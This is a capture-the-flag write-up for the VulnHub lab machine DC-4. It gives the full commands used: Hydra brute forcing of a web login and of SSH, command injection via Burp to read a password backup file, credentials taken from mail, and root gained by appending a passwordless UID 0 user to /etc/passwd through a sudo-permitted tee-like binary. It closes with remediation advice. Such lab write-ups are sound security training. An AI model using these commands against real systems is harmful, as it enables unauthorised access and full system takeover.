# DC-4 Write-up

> **Platform:** VulnHub, [DC-4](https://www.vulnhub.com/entry/dc-4,313/) **Machine:** DC-4 **Difficulty:** Beginner **Operating System:** Debian Linux **Author:** Ctum

---
## Overview

DC-4 shifts the focus toward brute forcing and lateral movement between three separate accounts before reaching root. There is no CMS or web framework vulnerability to exploit here. Instead, the path runs through a login form brute force, a leaked password file, a mail message containing plaintext credentials, and a `sudo` misconfiguration on a custom binary that mimics `tee`.

---
## Attack Path
1. Enumerated open services with Nmap.
2. Enumerated web content with Feroxbuster and DirBuster.
3. Brute forced the admin login form with Hydra.
4. Used command execution features in the admin panel (via Burp) to read local files.
5. Recovered a password list from a user's home directory.
6. Brute forced SSH logins using the recovered password list.
7. Logged in as `jim` and found a mail message with `charles`'s password.
8. Switched to `charles` and found a `sudo` NOPASSWD rule on a custom binary, `teehee`.
9. Abused `teehee` to add a new root-equivalent user to `/etc/passwd`.
10. Switched to the new user and retrieved the final flag.

---
## Initial Enumeration

Since I had already added `dc-4` to my hosts file, I scanned by hostname.

```bash
nmap -p- -sC -sV -T5 dc-4
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    nginx 1.15.10
|_http-title: System Tools
```

Two open ports: SSH and an nginx web server titled "System Tools."

---
## Web Content Enumeration

I ran Feroxbuster against the site to map out available paths.

```bash
feroxbuster -u http://dc-4 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

This turned up a small set of resources, most notably `login.php`, which redirected unauthenticated requests back to `index.php`. A second pass with DirBuster, using a slightly different wordlist, confirmed the same core pages:

```text
index.php
login.php
logout.php
command.php
```

The presence of `command.php` alongside a login page was a strong hint that this application allowed authenticated users to execute commands in some form.

---
## Brute Forcing the Login Form

The page title, "System Tools," combined with the login form, made `admin` a reasonable first guess for the username. I used Hydra to brute force the password against the login form directly.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt dc-4 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout"
```

This recovered valid admin credentials: **`admin : happy`**.

---
## Exploring the Admin Panel

After logging in, the application presented a set of radio-button options tied to specific system commands. Rather than relying only on the UI, I intercepted the requests with Burp Suite so I could modify the underlying command parameters directly.

One detail worth noting: any spaces in injected parameters needed to be URL-encoded as `+` for the request to process correctly.

Starting from the home directory listing, I found three user accounts: **charles**, **jim**, and **sam**.

---
## Recovering a Password List

Poking around `jim`'s home directory turned up a backups folder containing an old password list:

```text
cat+/home/jim/backups/old-passwords.bak
```

I saved this list locally at `/usr/share/wordlists/dc-4`, giving me a small, targeted set of candidate passwords to pair with the three known usernames.

---
## Brute Forcing SSH

With three usernames and a short, likely-relevant password list, I ran Hydra again, this time against SSH.

```bash
hydra -L dc4-users -P /usr/share/wordlists/dc-4 dc-4 ssh
```

```text
[22][ssh] host: dc-4   login: jim   password: jibril04
1 of 1 target successfully completed, 1 valid password found
```

One match: `jim : jibril04`.

---
## Finding Charles's Password in Mail

Logging into SSH as `jim` displayed a "You have mail." message immediately, which was a clear hint to check the local mail spool.

```bash
cd /var/mail
cat jim
```

The message was from `charles`, apparently sent before going on holiday, and contained his plaintext password directly in the body:

```text
Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles
```

---
## Privilege Escalation

I switched to the `charles` account using the leaked password, then checked what elevated commands were available to him.

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/teehee
```

`teehee` turned out to be a custom, less common binary. Its `--help` output showed it behaves like the standard `tee` command, supporting file writes and appends. Since it could be run as root without a password, and it could append to arbitrary files, this was enough to escalate directly.

I used it to append a new root-equivalent user to `/etc/passwd`:

```bash
echo "lemon::0:0::/bin/bash" | sudo teehee -a /etc/passwd
```

This created a user named `lemon` with no password and a UID of 0, meaning it had full root privileges the moment it existed.

```bash
su lemon
```

That dropped me straight into a root shell.

---
## Final Flag

```bash
cd /root
ls
cat flag.txt
```

```text
Congratulations!!!

Hope you enjoyed DC-4. Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

Machine complete.

---
## Flags Summary

|Flag|Location|How It Was Found|
|---|---|---|
|Final|`/root/flag.txt`|Retrieved after escalating to root via `teehee` and `/etc/passwd`|

DC-4 only contains a single flag, located in `/root` after full compromise.

---
## Remediation
- **Rate-limit or lock out login attempts** on the admin panel. The initial admin password fell to an unthrottled Hydra brute force against `login.php`.
- **Never store passwords in plaintext files**, including backup files like `old-passwords.bak`. Even old or "retired" credentials should be treated as sensitive and removed entirely, not archived.
- **Rate-limit or restrict SSH login attempts**, and disable password authentication in favor of key-based auth where possible.
- **Never send plaintext passwords over email**, even internally. If credentials must be shared, use a proper secrets manager or a one-time, expiring share link.
- **Audit `sudoers` entries carefully**, especially custom or unfamiliar binaries. A NOPASSWD rule on any binary capable of writing or appending to files (`tee`, or in this case a `tee`-like custom tool) is equivalent to full root access, since `/etc/passwd` and `/etc/shadow` become directly writable.
- **Monitor `/etc/passwd` for unexpected changes.** A new UID 0 entry appearing outside of normal account provisioning should trigger an alert.

---
## Lessons Learned
- Application-specific brute forcing (Hydra against a login form) works just as well as brute forcing standard services like SSH, and is often overlooked.
- Old or backup files left on disk (`old-passwords.bak`) are a common and easy source of valid credentials.
- Mail spools are worth checking on any multi-user Linux box. Internal messages sometimes contain exactly the kind of information that should never be sent that way.
- Not every privilege escalation path involves a well-known SUID binary or kernel exploit. Custom, unfamiliar tools granted through `sudo` deserve just as much scrutiny, since their behavior has to be reasoned about from scratch.
- Writing arbitrary content to `/etc/passwd` is one of the most direct ways to escalate to root, whenever any write primitive to that file is available.

---
## Tools Used
- Nmap
- Feroxbuster
- DirBuster
- Hydra
- Burp Suite
- SSH

---
## Technologies Encountered
- nginx
- OpenSSH
- Custom PHP admin panel
- Debian Linux

---
## Skills Practiced
- Network Enumeration
- Web Content Discovery
- Login Form Brute Forcing
- Request Interception and Modification (Burp Suite)
- SSH Credential Brute Forcing
- Mail Spool Enumeration
- Sudo Misconfiguration Exploitation